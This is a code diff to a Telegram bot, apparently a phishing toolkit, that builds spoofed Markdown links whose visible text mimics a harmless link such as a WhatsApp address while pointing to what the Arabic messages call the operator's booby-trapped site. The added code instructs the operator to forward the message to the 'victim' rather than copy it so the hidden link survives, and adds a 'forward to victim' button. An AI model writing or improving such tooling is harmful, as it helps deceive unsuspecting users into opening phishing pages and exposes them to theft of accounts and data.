@@ -1344,10 +1344,24 @@ bot.on('callback_query', async (q) => {
       wa:`wa.me/link/${Math.random().toString(36).slice(2,8)}`
     };
     const fakeText = fakeTexts[type] || realLink;
+    // First: explanation message
     return bot.sendMessage(chatId,
-      `🎭 *الرابط المخادع جاهز!*\n\nالضحية ستراه هكذا:\n\`${fakeText}\`\n\nأرسل هذه الرسالة للضحية كما هي (اضغط عليها للنسخ):`,
+      `🎭 *الرابط المخادع جاهز!*\n\n` +
+      `👇 *الرسالة التالية هي اللي تفوردها للضحية*\n` +
+      `عندما يضغط عليها سيُفتح موقعك الملغم مباشرةً 🎣\n\n` +
+      `⚠️ *مهم:* فوردها ولا تنسخ النص — الرابط المخفي يظهر فقط عند الفورد`,
       {parse_mode:"Markdown", reply_markup:JSON.stringify({inline_keyboard:[[{text:"🔙 رجوع",callback_data:"pg_links"}]]})}
-    ).then(()=>bot.sendMessage(chatId,`[${fakeText}](${realLink})`,{parse_mode:"Markdown"}));
+    ).then(()=>
+      // Second: the actual spoofed link message (user forwards this to victim)
+      bot.sendMessage(chatId,
+        `🔗 [${fakeText}](${realLink})`,
+        {parse_mode:"Markdown",
+         reply_markup:JSON.stringify({inline_keyboard:[
+           [{text:"📤 فوردها للضحية ↗️", switch_inline_query:`${fakeText}`}]
+         ]})
+        }
+      )
+    );
   }
 
   if (data === "pg_qr") {
